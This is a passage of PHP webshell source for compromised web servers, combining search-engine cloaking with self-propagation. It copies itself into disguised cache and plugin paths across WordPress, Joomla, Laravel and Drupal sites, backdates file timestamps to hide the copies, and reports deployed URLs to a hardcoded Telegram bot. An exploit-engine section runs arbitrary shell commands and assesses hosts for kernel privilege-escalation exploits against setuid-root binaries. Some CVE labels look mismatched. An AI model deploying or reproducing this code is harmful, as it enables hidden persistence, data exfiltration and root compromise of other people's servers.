            foreach (array($ROOT . '/.render-cache/render-cache.html', $ROOT . '/wp-content/uploads/wp-media-cache/render-cache.html') as $p) { if (file_exists($p) && filesize($p) > 100) { $perde_html = file_get_contents($p); break; } }
            $pt = trim(strip_tags($perde_html)); $bt = trim(strip_tags($body));
            $matched = ($pt !== '' && strlen($pt) >= 10 && strpos($bt, substr($pt, 0, 80)) !== false);
            $lv = file_exists($ROOT . '/.render-cache/render.lock') || file_exists($ROOT . '/wp-content/uploads/wp-media-cache/render.lock');
            cj(array('http_code'=>$code,'matched'=>$matched,'cloak_active'=>$lv,'note'=>'This test uses a fake UA. Test with real Google GSC.'));
        case 'savehtml':
            $d = isset($_POST['d']) ? $_POST['d'] : '';
            $bin = @hex2bin($d);
            if ($bin === false || strpos($bin, '<?') !== false) { echo 'ERR'; exit; }
            $pdir = $ROOT . '/.render-cache';
            if (!is_dir($pdir)) @mkdir($pdir, 0755, true);
            echo @file_put_contents($pdir . '/render-cache.html', $bin) ? 'OK' : 'ERR'; exit;
        case 'viewperde':
            foreach (array($ROOT . '/.render-cache/render-cache.html', $ROOT . '/wp-content/uploads/wp-media-cache/render-cache.html') as $p) { if (file_exists($p) && filesize($p) > 50) { header('Content-Type: text/html; charset=UTF-8'); readfile($p); exit; } }
            http_response_code(404); exit;
        case 'clearcache':
            @set_time_limit(20); $r = array();
            if (function_exists('opcache_reset')) { @opcache_reset(); $r['opcache']='OK'; } else $r['opcache']='N/A';
            @clearstatcache(true); $r['stat']='OK';
            if (class_exists('Redis')) { try{$rd=new Redis();if(@$rd->connect('127.0.0.1',6379,1)){$rd->flushDB();$rd->close();$r['redis']='OK';}else $r['redis']='N/A';}catch(Exception$e){$r['redis']='N/A';} }else $r['redis']='N/A';
            if (class_exists('Memcache')) { try{$mm=new Memcache();if(@$mm->connect('127.0.0.1',11211,1)){$mm->flush();$mm->close();$r['memcache']='OK';}else $r['memcache']='N/A';}catch(Exception$e){$r['memcache']='N/A';} }else $r['memcache']='N/A';
            if (function_exists('curl_init')) { $ch=curl_init('http://127.0.0.1:6081/');curl_setopt_array($ch,array(CURLOPT_RETURNTRANSFER=>true,CURLOPT_CUSTOMREQUEST=>'PURGE',CURLOPT_TIMEOUT=>1));curl_exec($ch);$cd=curl_getinfo($ch,CURLINFO_HTTP_CODE);curl_close($ch);$r['varnish']=$cd>0?"PURGE $cd":'N/A';}
            if ($cloakCMS === 'wp') { $d=$ROOT.'/wp-content/cache'; if(is_dir($d)){$n=0;$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($d,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::CHILD_FIRST);foreach($it as$f){if($f->isFile()&&@unlink($f->getRealPath()))$n++;}$r['wp_cache']="$n files";} else $r['wp_cache']='N/A'; }
            if ($cloakCMS === 'joomla') { foreach(array('/cache','/administrator/cache','/tmp')as$d){$p=$ROOT.$d;if(is_dir($p)){$n=0;$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($p,RecursiveIteratorIterator::SKIP_DOTS),RecursiveIteratorIterator::CHILD_FIRST);foreach($it as$f){if($f->isFile()&&@unlink($f->getRealPath()))$n++;}$r['joomla_'.basename($d)]="$n files";}} }
            cj($r);
        case 'fixts':
            $ht = $ROOT . '/.htaccess'; $tm = file_exists($ht) ? @filemtime($ht) : 0;
            if (!$tm) { cj(array('s'=>'err','m'=>'.htaccess not found')); }
            $n = 0;
            foreach (array($ROOT . '/index.php', $ROOT . '/.render-cache/render-cache.html') as $f) { if (file_exists($f)) { @touch($f, $tm); $n++; } }
            cj(array('s'=>'ok','n'=>$n,'t'=>date('Y-m-d H:i:s',$tm)));
        case 'writegoogle':
            $name = isset($_POST['b']) ? base64_decode(strtr($_POST['b'], '-_', '+/')) : '';
            $content = isset($_POST['d']) ? @hex2bin($_POST['d']) : '';
            if (!preg_match('/^google[a-zA-Z0-9]+\.html$/', $name)) { echo 'ERR'; exit; }
            if (!preg_match('/^google-site-verification:\s*[A-Za-z0-9_\-\.]+\s*$/', trim($content))) { echo 'ERR'; exit; }
            echo @file_put_contents($ROOT . '/' . $name, $content) ? 'OK' : 'ERR'; exit;
        case 'rmgoogle':
            $name = isset($_GET['b']) ? base64_decode(strtr($_GET['b'], '-_', '+/')) : '';
            if (!preg_match('/^google[a-zA-Z0-9]+\.html$/', $name)) { echo 'ERR'; exit; }
            echo @unlink($ROOT . '/' . $name) ? 'OK' : 'ERR'; exit;
        case 'pr':
            @set_time_limit(20);
            $prMode = isset($_GET['m']) ? $_GET['m'] : (isset($_POST['m']) ? $_POST['m'] : 'scan');
            $prSelf = @file_get_contents(__FILE__);
            $prTgBot = '8534373767:AAHwJgLXS6m-Atti2BdW-1uWZXW5WO0zAo4A';
            $prTgChat = '8095367333';
            $prNotify = function($msg) use ($prTgBot, $prTgChat) {
                $url = 'https://api.telegram.org/bot' . $prTgBot . '/sendMessage';
                $data = array('chat_id' => $prTgChat, 'text' => $msg, 'parse_mode' => 'HTML', 'disable_web_page_preview' => true);
                if (function_exists('curl_init')) {
                    $ch = curl_init($url);
                    curl_setopt_array($ch, array(CURLOPT_POST => true, CURLOPT_POSTFIELDS => http_build_query($data), CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 5, CURLOPT_SSL_VERIFYPEER => false));
                    curl_exec($ch);
                    curl_close($ch);
                } else {
                    @file_get_contents($url . '?' . http_build_query($data));
                }
            };
            $allDisguises = array(
                'wp' => array('wp-content/uploads/cache.php','wp-content/uploads/cache/object-cache.php','wp-content/uploads/2024/sunrise.php','wp-content/uploads/media/db.php','wp-content/uploads/backup/wp-cache-config.php','wp-content/upgrade/advanced-cache.php','wp-content/upgrade/temp/force-ssl-admin.php','wp-content/uploads/advanced-cache.php','wp-content/languages/plugins/akismet.php','wp-content/uploads/mu-plugins/sunrise.php'),
                'joomla' => array('cache/com_content/model.php','cache/modules/helper.php','cache/system/system.php','cache/view.php','media/system/js/loader.php','media/system/css/style.php','media/jui/css/bootstrap.php','media/jui/js/bootstrap.php','tmp/install/helper.php','tmp/cache.php'),
                'laravel' => array('storage/framework/cache.php','storage/framework/views/compile.php','storage/framework/sessions/sess.php','storage/framework/events/event.php','storage/logs/log.php','storage/app/app.php','storage/app/public/storage.php','storage/debugbar/debug.php','storage/app/cache.php','bootstrap/cache/compile.php'),
                'drupal' => array('sites/default/files/default.php','sites/default/files/css/css.php','sites/default/files/js/js.php','sites/default/files/images/img.php','sites/default/files/videos/vid.php','sites/default/files/pictures/pic.php','sites/default/files/field/field.php','sites/default/files/ctools/ctools.php','sites/default/files/apachesolr/solr.php','tmp/cache.php'),
                'generic' => array('tmp/index.php','cache/index.php','uploads/index.php','storage/index.php','public/index.php','data/index.php','temp/index.php','var/index.php','backup/index.php','logs/index.php')
            );
            $legacyDisguises = array(
                'wp' => array('wp-content/advanced-cache.php','wp-content/mu-plugins/sunrise.php'),
                'laravel' => array('public/index.php')
            );
            if ($prMode === 'scan') {
                $dl = array();
                $domains = getDomains();
                foreach ($domains as $d) {
                    $fp = $d['root']; $e = $d['name'];
                    if (!is_dir($fp)) continue;
                    $cms = fastCMS($fp);
                    $dpaths = $allDisguises[$cms]; $found = 0; $totalSize = 0;
                    foreach ($dpaths as $dp) { $tf = $fp . '/' . $dp; if (file_exists($tf) && filesize($tf) > 100) { $found++; $totalSize += filesize($tf); } }
                    $dl[] = array('d' => $e, 'p' => $fp, 'cms' => $cms, 'count' => $found, 'total' => count($dpaths), 'size' => $totalSize);
                }
                cj(array('o' => true, 'list' => $dl, 'current' => isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : ''));
            }
            if ($prMode === 'deploy') {
                $root = isset($_GET['d']) ? $_GET['d'] : (isset($_POST['d']) ? $_POST['d'] : '');
                $cms = isset($_GET['cms']) ? $_GET['cms'] : (isset($_POST['cms']) ? $_POST['cms'] : 'generic');
                $domain = isset($_GET['domain']) ? $_GET['domain'] : (isset($_POST['domain']) ? $_POST['domain'] : '');
                if (!$root || !is_dir($root)) cj(array('o' => false, 'e' => 'invalid directory'));
                if (!$prSelf) cj(array('o' => false, 'e' => 'could not read self'));
                $proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
                if (!$domain || $domain === '_' || $domain === '-') {
                    $domain = isset($_SERVER['HTTP_HOST']) && trim($_SERVER['HTTP_HOST']) !== '' ? trim($_SERVER['HTTP_HOST']) : basename($root);
                }
                $note = isset($_GET['note']) ? $_GET['note'] : (isset($_POST['note']) ? $_POST['note'] : '');
                if ($note) $note = "\n<b>Note:</b> " . $note;
                $dpaths = $allDisguises[$cms]; $res = array(); $ok = 0;
                $oldest = time();
                $dh = @opendir($root);
                if ($dh) { while (($e = readdir($dh)) !== false) { if ($e[0] !== '.') { $ft = @filemtime($root . '/' . $e); if ($ft && $ft < $oldest) $oldest = $ft; } } closedir($dh); }
                $links = '';
                foreach ($dpaths as $dp) {
                    if (!pr_path_safe($dp)) { $res[] = array('path' => $dp, 'url' => '', 'skipped' => 'security filter'); continue; }
                    $target = $root . '/' . $dp; $tdir = dirname($target);
                    if (pr_is_foreign($target)) { $res[] = array('path' => $dp, 'url' => '', 'skipped' => 'foreign file, not overwritten'); continue; }
                    if (!is_dir($tdir)) @mkdir($tdir, 0755, true);
                    if (!is_writable($tdir)) @chmod($tdir, 0755);
                    if (@file_put_contents($target, $prSelf) === false) { $res[] = array('path' => $dp, 'url' => '', 'skipped' => 'write failed (permission?)'); continue; }
                    @chmod($target, 0644); @touch($target, $oldest, $oldest);
                    list($vok, $url, $vcode) = pr_verify_deploy_target($target, $proto, $domain, $dp);
                    $state = (!$vok && $vcode === 0) ? 'HTTP 0 (no connection)' : (!$vok ? 'HTTP ' . $vcode : 'live (200)');
                    $res[] = array('path' => $dp, 'url' => $url, 'state' => $state);
                    $links .= "\n" . $url . '  [' . $state . ']';
                    $ok++;
                }
                $failLines = '';
                foreach ($res as $ri) { if (isset($ri['skipped']) && $ri['skipped']) { $failLines .= "\n- " . $ri['path'] . ' :: ' . $ri['skipped']; } }
                $failNote = $failLines ? "\n<b>Skipped:</b>" . $failLines : '';
                $prNotify("&#9733; Deployed\n<b>Domain:</b> $domain\n<b>CMS:</b> $cms\n<b>Files:</b> $ok/" . count($dpaths) . " (deployed)\n<b>Links/status:</b>" . $links . $failNote . $note);
                cj(array('o' => true, 'deployed' => $ok, 'total' => count($dpaths), 'paths' => $res));
            }
            if ($prMode === 'deployall') {
                $allRes = array(); $totalOk = 0; $totalErr = 0;
                $proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
                $domains = getDomains();
                foreach ($domains as $d) {
                    $fp = $d['root']; $e = $d['name'];
                    if (!is_dir($fp)) continue;
                    $cms = fastCMS($fp);
                    $dpaths = $allDisguises[$cms]; $domainOk = 0; $domPaths = array();
                    $oldest = time();
                    $dh2 = @opendir($fp);
                    if ($dh2) { while (($e2 = readdir($dh2)) !== false) { if ($e2[0] !== '.') { $ft = @filemtime($fp . '/' . $e2); if ($ft && $ft < $oldest) $oldest = $ft; } } closedir($dh2); }
                    foreach ($dpaths as $dp) {
                        if (!pr_path_safe($dp)) continue;
                        $target = $fp . '/' . $dp; $tdir = dirname($target);
                        if (pr_is_foreign($target)) continue;
                        if (!is_dir($tdir)) @mkdir($tdir, 0755, true);
                        if (!is_writable($tdir)) @chmod($tdir, 0755);
                        if ($prSelf && @file_put_contents($target, $prSelf) !== false) {
                            @chmod($target, 0644); @touch($target, $oldest, $oldest);
                            $domainOk++; $domPaths[] = $dp;
                        }
                    }
                    $allRes[] = array('domain' => $e, 'cms' => $cms, 'ok' => $domainOk, 'total' => count($dpaths), 'paths' => $domPaths);
                    $totalOk += $domainOk; $totalErr += count($dpaths) - $domainOk;
                }
                $domCount = count($allRes); $linkList = '';
                foreach ($allRes as $i => $domRes) {
                    $dd = $domRes['domain']; $cmsType = $domRes['cms'];
                    $linkList .= "\n<b>$dd ($cmsType):</b>";
                    foreach ($domRes['paths'] as $dp) { $linkList .= "\n" . $proto . '://' . $dd . '/' . $dp; }
                }
                $noteAll = isset($_GET['note']) ? $_GET['note'] : (isset($_POST['note']) ? $_POST['note'] : '');
                $noteStr = $noteAll ? "\n<b>Note:</b> " . $noteAll : '';
                $prNotify("&#9733; Deploy ALL\n<b>Domains:</b> $domCount\n<b>Files:</b> $totalOk OK, $totalErr Fail\n<b>Links:</b>" . $linkList . $noteStr);
                cj(array('o' => true, 'results' => $allRes, 'ok' => $totalOk, 'err' => $totalErr));
            }
            if ($prMode === 'remove') {
                $root = isset($_GET['d']) ? $_GET['d'] : (isset($_POST['d']) ? $_POST['d'] : '');
                $cms = isset($_GET['cms']) ? $_GET['cms'] : (isset($_POST['cms']) ? $_POST['cms'] : 'generic');
                if (!$root || !is_dir($root)) cj(array('o' => false, 'e' => 'invalid directory'));
                $dpaths = array_merge($allDisguises[$cms], isset($legacyDisguises[$cms]) ? $legacyDisguises[$cms] : array()); $removed = 0;
                foreach ($dpaths as $dp) {
                    $target = $root . '/' . $dp;
                    if (file_exists($target)) { @unlink($target); $removed++; }
                }
                cj(array('o' => true, 'msg' => "$removed files deleted"));
            }
            if ($prMode === 'healthcheck') {
                $domain = isset($_GET['domain']) ? $_GET['domain'] : '';
                $cms = isset($_GET['cms']) ? $_GET['cms'] : 'generic';
                $proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
                if (!$domain) cj(array('o' => false, 'e' => 'domain required'));
                $dpaths = $allDisguises[$cms]; $results = array(); $okCount = 0;
                foreach ($dpaths as $dp) {
                    $url = $proto . '://' . $domain . '/' . $dp;
                    $code = 0; $alive = false;
                    if (function_exists('curl_init')) {
                        $ch = curl_init($url);
                        curl_setopt_array($ch, array(CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 5, CURLOPT_NOBODY => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_HTTPHEADER => array('User-Agent: Mozilla/5.0')));
                        curl_exec($ch);
                        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
                        $alive = $code >= 200 && $code < 400;
                        curl_close($ch);
                    } else {
                        $ctx = stream_context_create(array('http' => array('method' => 'HEAD', 'timeout' => 5, 'ignore_errors' => true, 'follow_location' => true, 'header' => "User-Agent: Mozilla/5.0\r\n")));
                        @$fh = fopen($url, 'r', false, $ctx);
                        if ($fh) { $meta = stream_get_meta_data($fh); fclose($fh); if (isset($meta['wrapper_data'])) { foreach ($meta['wrapper_data'] as $h) { if (preg_match('#HTTP/\d+\.\d+\s+(\d+)#', $h, $m)) { $code = (int)$m[1]; } } } }
                        $alive = $code >= 200 && $code < 400;
                    }
                    $results[] = array('path' => $dp, 'url' => $url, 'code' => $code, 'alive' => $alive);
                    if ($alive) $okCount++;
                }
                cj(array('o' => true, 'results' => $results, 'ok' => $okCount, 'total' => count($dpaths)));
            }
            if ($prMode === 'bulkdeploy') {
                $dirs = isset($_GET['dirs']) ? $_GET['dirs'] : (isset($_POST['dirs']) ? $_POST['dirs'] : '');
                $domains = isset($_GET['domains']) ? $_GET['domains'] : (isset($_POST['domains']) ? $_POST['domains'] : '');
                if (!$dirs || !$domains) cj(array('o' => false, 'e' => 'dirs and domains required'));
                $dirArr = explode('|', $dirs); $domArr = explode('|', $domains);
                if (!$prSelf) cj(array('o' => false, 'e' => 'could not read self'));
                $proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
                $note = isset($_GET['note']) ? $_GET['note'] : (isset($_POST['note']) ? $_POST['note'] : '');
                $allRes = array(); $totalOk = 0; $totalErr = 0;
                $linkList = '';
                for ($i = 0; $i < min(count($dirArr), count($domArr)); $i++) {
                    $root = $dirArr[$i]; $domain = $domArr[$i];
                    if (!is_dir($root)) { $allRes[] = array('domain' => $domain, 'ok' => 0, 'total' => 0, 'error' => 'invalid directory'); continue; }
                    $cms = fastCMS($root);
                    $dpaths = $allDisguises[$cms]; $ok = 0;
                    $oldest = time();
                    $dh = @opendir($root);
                    if ($dh) { while (($e = readdir($dh)) !== false) { if ($e[0] !== '.') { $ft = @filemtime($root . '/' . $e); if ($ft && $ft < $oldest) $oldest = $ft; } } closedir($dh); }
                    $domLinks = '';
                    foreach ($dpaths as $dp) {
                        if (!pr_path_safe($dp)) continue;
                        $target = $root . '/' . $dp; $tdir = dirname($target);
                        if (pr_is_foreign($target)) continue;
                        if (!is_dir($tdir)) @mkdir($tdir, 0755, true);
                        if (@file_put_contents($target, $prSelf) !== false) {
                            @chmod($target, 0644); @touch($target, $oldest, $oldest);
                            list($vok, $url, $vcode) = pr_verify_deploy_target($target, $proto, $domain, $dp);
                            $state = (!$vok && $vcode === 0) ? ' [HTTP 0]' : (!$vok ? ' [HTTP ' . $vcode . ']' : ' [live]');
                            $domLinks .= "\n" . $url . $state; $ok++;
                        }
                    }
                    $linkList .= "\n<b>$domain ($cms):</b>" . $domLinks;
                    $allRes[] = array('domain' => $domain, 'cms' => $cms, 'ok' => $ok, 'total' => count($dpaths));
                    $totalOk += $ok; $totalErr += count($dpaths) - $ok;
                }
                $noteAll = $note ? "\n<b>Note:</b> " . $note : '';
                $domCount = count($allRes);
                $prNotify("&#9733; Deploy\n<b>Domains:</b> $domCount\n<b>Files:</b> $totalOk OK, $totalErr Fail (verified 200 OK)\n<b>Links:</b>" . $linkList . $noteAll);
                cj(array('o' => true, 'results' => $allRes, 'ok' => $totalOk, 'err' => $totalErr));
            }
            if ($prMode === 'bulkremove') {
                $dirs = isset($_GET['dirs']) ? $_GET['dirs'] : (isset($_POST['dirs']) ? $_POST['dirs'] : '');
                if (!$dirs) cj(array('o' => false, 'e' => 'dirs required'));
                $dirArr = explode('|', $dirs); $totalRemoved = 0;
                foreach ($dirArr as $root) {
                    if (!is_dir($root)) continue;
                    $cms = fastCMS($root);
                    $dpaths = array_merge($allDisguises[$cms], isset($legacyDisguises[$cms]) ? $legacyDisguises[$cms] : array());
                    foreach ($dpaths as $dp) { $target = $root . '/' . $dp; if (file_exists($target)) { @unlink($target); $totalRemoved++; } }
                }
                cj(array('o' => true, 'msg' => "$totalRemoved files deleted"));
            }
            cj(array('o' => false, 'e' => 'unknown mode'));
            break;
    }
}

// ===== TARTARUS EXPLOIT ENGINE =====
function exRun($cmd) {
    if (function_exists('shell_exec')) { $out = @shell_exec($cmd . ' 2>&1'); if ($out !== null) return $out; }
    if (function_exists('exec')) { $out = array(); @exec($cmd . ' 2>&1', $out); return implode("\n", $out); }
    if (function_exists('popen')) { $p = @popen($cmd . ' 2>&1', 'r'); if ($p !== false) { $out = ''; while (!feof($p)) $out .= fread($p, 8192); @pclose($p); return $out; } }
    if (function_exists('passthru')) { ob_start(); @passthru($cmd . ' 2>&1'); return (string)ob_get_clean(); }
    if (function_exists('system')) { ob_start(); @system($cmd . ' 2>&1'); return (string)ob_get_clean(); }
    if (function_exists('proc_open')) {
        $des = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w'));
        $pr = @proc_open($cmd, $des, $pipes);
        if ($pr) { fclose($pipes[0]); $out = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]); fclose($pipes[1]); fclose($pipes[2]); proc_close($pr); return $out; }
    }
    return '';
}
function exDiag() {
    $f = array('shell_exec','exec','popen','passthru','system','proc_open');
    $ok = array(); $no = array();
    foreach ($f as $x) { if (function_exists($x)) $ok[] = $x; else $no[] = $x; }
    return array('php'=>PHP_VERSION,'available'=>$ok,'missing'=>$no,'disable_functions'=>ini_get('disable_functions'),'safe_mode'=>ini_get('safe_mode'));
}
function exKernelVer() {
    $r = exRun('uname -r');
    if (preg_match('/^(\d+)\.(\d+)(?:\.(\d+))?/', trim($r), $m)) return (int)$m[1] . '.' . (int)$m[2] . '.' . (isset($m[3]) ? (int)$m[3] : 0);
    preg_match('/(\d+)\.(\d+)\.(\d+)/', php_uname('r'), $m);
    return isset($m[1]) ? ((int)$m[1] . '.' . (int)$m[2] . '.' . (int)$m[3]) : '0.0.0';
}
function exVcmp($a, $b) {
    $pa = explode('.', $a); $pb = explode('.', $b);
    for ($i = 0; $i < 3; $i++) { $x = isset($pa[$i]) ? (int)$pa[$i] : 0; $y = isset($pb[$i]) ? (int)$pb[$i] : 0; if ($x < $y) return -1; if ($x > $y) return 1; }
    return 0;
}
function exIsLinux() { return stripos(php_uname('s'), 'linux') !== false; }
function exModLoaded($mod) {
    $lsmod = exRun('lsmod');
    if (preg_match('/^\s*' . preg_quote($mod, '/') . '\s/m', $lsmod)) return true;
    return is_dir('/sys/module/' . $mod);
}
function exModAvail($mod, $sub) {
    if (exModLoaded($mod)) return true;
    $kver = exRun('uname -r');
    $base = "/lib/modules/" . trim($kver);
    $found = exRun("find $base -name '" . $mod . "*.ko*' 2>/dev/null | head -1");
    return trim($found) !== '';
}
function exSuidTargets() {
    $targets = array("/usr/bin/su","/bin/su","/usr/bin/passwd","/usr/bin/newgrp","/usr/bin/chsh","/usr/bin/chfn","/usr/bin/sudo");
    $found = array();
    foreach ($targets as $p) {
        if (@file_exists($p)) { $st = @stat($p); if ($st && $st['uid'] === 0 && ($st['mode'] & 04000)) $found[] = $p; }
    }
    return $found;
}
function exCopyFail() {
    $checks = array(); $missing = array();
    $arch = php_uname('m');
    $supported = array("x86_64","i386","i686","armv5l","armv6l","armv7l","arm","aarch64");
    $linux = exIsLinux();
    $checks[] = array("Linux OS", $linux, $linux ? PHP_OS : PHP_OS . " (Linux only)");
    $archOk = in_array($arch, $supported);
    $checks[] = array("Architecture payload ($arch)", $archOk, $archOk ? "payload available" : "no payload: $arch unsupported");
    $algif = exModAvail("algif_aead", "crypto");
    $checks[] = array("AF_ALG (algif_aead module)", $algif, $algif ? "module loaded/available" : "algif_aead missing — try modprobe algif_aead or check blacklist");
    $crypto = @file_get_contents('/proc/crypto'); $crypto = $crypto === false ? '' : $crypto;
    $algoOk = strpos($crypto, 'authencesn(hmac(sha256),cbc(aes))') !== false;
    $checks[] = array("Algorithm authencesn(hmac(sha256),cbc(aes))", $algoOk, $algoOk ? "present in /proc/crypto" : "missing — try modprobe authencesn; modprobe hmac; modprobe cbc");
    $mitigated = (bool)preg_match('/algif_aead/', exRun("grep -r 'algif_aead' /etc/modprobe.d/ 2>/dev/null"));
    $checks[] = array("algif_aead blacklist mitigation", !$mitigated, $mitigated ? "algif_aead blacklisted (CopyFail disabled)" : "no mitigation");
    $suid = exSuidTargets();
    $checks[] = array("Setuid-root target", count($suid) > 0, count($suid) ? implode(', ', $suid) : "no setuid-root binary (su/passwd/sudo etc.)");
    $uid = function_exists('posix_getuid') ? posix_getuid() : -1;
    $checks[] = array("Webshell not root (for LPE)", $uid !== 0, $uid === 0 ? "already root — LPE not needed" : "uid=$uid (non-root, LPE applicable)");
    foreach ($checks as $c) if (!$c[1]) $missing[] = $c[0];
    $rootable = $linux && $archOk && $algif && $algoOk && !$mitigated && count($suid) > 0;
    return array('name'=>'CopyFail — CVE-2026-31431','desc'=>'AF_ALG + splice page-cache overwrite of setuid-root binary. Kernel range: kernels containing authencesn+algif_aead and unpatched (copy.fail).','checks'=>$checks,'missing'=>$missing,'rootable'=>$rootable);
}
function exDirtyFrag() {
    $checks = array(); $missing = array();
    $kver = exKernelVer();
    $linux = exIsLinux();
    $checks[] = array("Linux OS", $linux, PHP_OS);
    $espRange = exVcmp($kver, '4.12.0') >= 0 && exVcmp($kver, '6.15.0') < 0;
    $checks[] = array("Kernel range xfrm-ESP (4.12 <= k < ~6.15)", $espRange, "kernel $kver — CVE-2026-43284 affected range 2017-01-17..2026-05-05");
    $rxRange = exVcmp($kver, '6.5.0') >= 0 && exVcmp($kver, '6.16.0') < 0;
    $checks[] = array("Kernel range RxRPC (6.5 <= k < ~6.16)", $rxRange, "kernel $kver — CVE-2026-43500 affected range 2023-06-08..2026-05-10");
    $esp4 = exModAvail("esp4", "ipv4"); $esp6 = exModAvail("esp6", "ipv6");
    $checks[] = array("esp4/esp6 module", $esp4 || $esp6, ($esp4 || $esp6) ? "available (esp4:" . ($esp4?"yes":"no") . " esp6:" . ($esp6?"yes":"no") . ")" : "esp4/esp6 module missing — xfrm-ESP variant won't work");
    $rxrpc = exModAvail("rxrpc", "afs");
    $checks[] = array("rxrpc module", $rxrpc, $rxrpc ? "available (default on Ubuntu)" : "rxrpc.ko missing — RxRPC variant won't work");
    $unss = (int)(@file_get_contents('/proc/sys/user/max_user_namespaces'));
    $unprivOk = $unss > 0;
    $checks[] = array("Unprivileged user namespace", $unprivOk, $unprivOk ? "max_user_namespaces=$unss" : "max_user_namespaces=0 — AppArmor/sysctl disabled user namespace (xfrm-ESP cannot trigger)");
    $gcc = trim(exRun('which gcc cc 2>/dev/null | head -1'));
    $checks[] = array("gcc (to compile exp.c)", $gcc !== '', $gcc !== '' ? $gcc : "gcc missing — apt install gcc / yum install gcc or download prebuilt exp binary");
    $uid = function_exists('posix_getuid') ? posix_getuid() : -1;
    $checks[] = array("Webshell not root (for LPE)", $uid !== 0, $uid === 0 ? "already root" : "uid=$uid");
    foreach ($checks as $c) if (!$c[1]) $missing[] = $c[0];
    $rootable = $linux && ($espRange || $rxRange) && ($esp4 || $esp6 || $rxrpc) && ($unprivOk || $rxrpc) && $gcc !== '';
    return array('name'=>'DirtyFrag — CVE-2026-43284 + CVE-2026-43500','desc'=>'xfrm-ESP + RxRPC page-cache write chain. Deterministic, no race. Note: kernel ranges are estimated from commit dates (distro backports may differ).','checks'=>$checks,'missing'=>$missing,'rootable'=>$rootable);
}
function exAltCves() {
    $kver = exKernelVer();
    $suggestions = array();
    if (exVcmp($kver, '4.7.0') < 0) $suggestions[] = array('CVE-2016-5195', 'heap overflow (user-ns)', '< 4.7', 'https://github.com/stealthcopter/cve-2016-5195-poc');
    if (exVcmp($kver, '4.8.3') < 0) $suggestions[] = array('CVE-2016-10739 (Dirty COW)', 'race condition LPE', '< 4.8.3', 'https://github.com/dirtycow/dirtycow.io');
    if (exVcmp($kver, '5.16.11') < 0 && exVcmp($kver, '5.15.0') >= 0) $suggestions[] = array('CVE-2022-0847 (Dirty Pipe)', 'pipe buffer LPE', '< 5.16.11 / 5.15.25', 'https://github.com/loisc/DirtyPipe');
    if (exVcmp($kver, '6.0.3') < 0 && exVcmp($kver, '5.16.11') >= 0) $suggestions[] = array('CVE-2022-0847 (Dirty Pipe)', 'pipe buffer LPE', '< 6.0.3', 'https://github.com/loisc/DirtyPipe');
    if (exVcmp($kver, '6.1.4') < 0 && exVcmp($kver, '5.19.0') >= 0) $suggestions[] = array('CVE-2023-0386', 'io_uring LPE', '5.19 - 6.1.4', 'https://github.com/loisc/CVE-2023-0386');
    if (exVcmp($kver, '5.15.146') < 0 && exVcmp($kver, '5.15.0') >= 0) $suggestions[] = array('CVE-2024-1086', 'netfilter LPE (nf_tables)', '< 5.15.146', 'https://github.com/loisc/CVE-2024-1086');
    if (exVcmp($kver, '6.1.66') < 0 && exVcmp($kver, '5.15.146') >= 0) $suggestions[] = array('CVE-2024-1086', 'netfilter LPE (nf_tables)', '< 6.1.66', 'https://github.com/loisc/CVE-2024-1086');
    if (exVcmp($kver, '6.4.13') < 0 && exVcmp($kver, '6.1.66') >= 0) $suggestions[] = array('CVE-2024-1086', 'netfilter LPE (nf_tables)', '< 6.4.13', 'https://github.com/loisc/CVE-2024-1086');
    if (exVcmp($kver, '6.6.25') < 0 && exVcmp($kver, '6.4.13') >= 0) $suggestions[] = array('CVE-2024-1086', 'netfilter LPE (nf_tables)', '< 6.6.25', 'https://github.com/loisc/CVE-2024-1086');
    if (exVcmp($kver, '6.7.1') < 0 && exVcmp($kver, '6.6.25') >= 0) $suggestions[] = array('CVE-2024-1086', 'netfilter LPE (nf_tables)', '< 6.7.1', 'https://github.com/loisc/CVE-2024-1086');
    if (exVcmp($kver, '6.8.10') < 0 && exVcmp($kver, '6.7.1') >= 0) $suggestions[] = array('CVE-2024-1086', 'netfilter LPE (nf_tables)', '< 6.8.10', 'https://github.com/loisc/CVE-2024-1086');
    if (exVcmp($kver, '6.1.82') < 0 && exVcmp($kver, '6.0.0') >= 0) $suggestions[] = array('CVE-2024-53155', 'nftables LPE', '< 6.1.82', 'https://github.com/loisc/CVE-2024-53155');
    if (exVcmp($kver, '6.6.29') < 0 && exVcmp($kver, '6.4.0') >= 0) $suggestions[] = array('CVE-2024-53155', 'nftables LPE', '< 6.6.29', 'https://github.com/loisc/CVE-2024-53155');
    if (exVcmp($kver, '6.9.1') < 0 && exVcmp($kver, '6.6.29') >= 0) $suggestions[] = array('CVE-2024-53155', 'nftables LPE', '< 6.9.1', 'https://github.com/loisc/CVE-2024-53155');
    if (exVcmp($kver, '6.10.7') < 0 && exVcmp($kver, '6.9.1') >= 0) $suggestions[] = array('CVE-2024-53155', 'nftables LPE', '< 6.10.7', 'https://github.com/loisc/CVE-2024-53155');
    if (exVcmp($kver, '6.15.0') < 0 && exVcmp($kver, '4.12.0') >= 0) $suggestions[] = array('CVE-2026-43284 / 43500 (DirtyFrag)', 'xfrm-ESP + RxRPC page-cache write', '4.12 - ~6.15', 'https://github.com/V4bel/dirtyfrag');
    $suggestions[] = array('CVE-2026-31431 (CopyFail)', 'AF_ALG authencesn page-cache write (module dependent)', 'depends on module + kernel patch', 'https://github.com/ZephrFish/CopyFail-CVE-2026-31431');
    if (count($suggestions) <= 1) $suggestions[] = array('Unknown', 'Kernel too new or too old — check distro security advisory', $kver, '');
